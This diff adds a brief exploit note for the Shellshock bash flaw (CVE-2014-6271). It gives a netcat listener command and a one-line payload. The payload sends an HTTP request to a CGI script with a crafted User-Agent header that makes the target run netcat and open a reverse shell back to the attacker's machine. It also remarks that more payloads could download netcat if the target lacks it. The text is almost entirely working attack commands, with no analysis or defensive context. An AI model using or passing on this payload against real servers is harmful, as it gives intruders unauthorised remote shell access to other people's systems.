@@ -1,0 +1,11 @@
+CVE-2014-6271/Shellshock
+
+
+
+In local machine: nc -l -p 443
+
+Payload: echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc localmachine 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+
+
+* Assuming the other machine has netcat installed and is under /usr/bin/. Other wise it has to be downloaded via more payloads.
